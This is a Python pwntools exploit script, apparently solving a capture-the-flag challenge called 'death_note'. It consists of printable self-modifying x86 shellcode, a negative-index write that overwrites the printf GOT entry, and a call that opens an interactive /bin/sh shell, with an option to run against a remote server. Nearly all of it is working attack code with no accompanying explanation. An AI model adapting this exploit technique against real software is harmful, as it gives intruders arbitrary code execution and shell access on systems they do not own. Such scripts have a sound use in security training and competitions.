from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './death_note'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
def add_note(index,name):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Index :')
    p.sendline(str(index).encode())
    p.recvuntil(b'Name :')
    p.sendline(name)

shellcode = asm('''
        pop ebx
        pop ebx
        push ebx
        pop ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        push edx
        pop eax
        dec eax
        xor    BYTE [ecx+0x2b],al
        inc eax
        inc eax
        xor    BYTE [ecx+0x2c],al
        dec eax
        dec eax
        xor    BYTE [ecx+0x2c],al
        inc eax
        xor al, 0x41
        xor al, 0x4a
        push edx
        pop ecx
        xor    bh,BYTE  [esi+0x42]
        ''')



def pwn(shellcode):
    printf_got = elf.got['printf']
    note_addr = 0x0804A060
    off_set = printf_got-note_addr
    index = off_set/4
    add_note(0, b"/bin/sh\x00")
    add_note(-19, shellcode)
    
    p.interactive()

pwn(shellcode)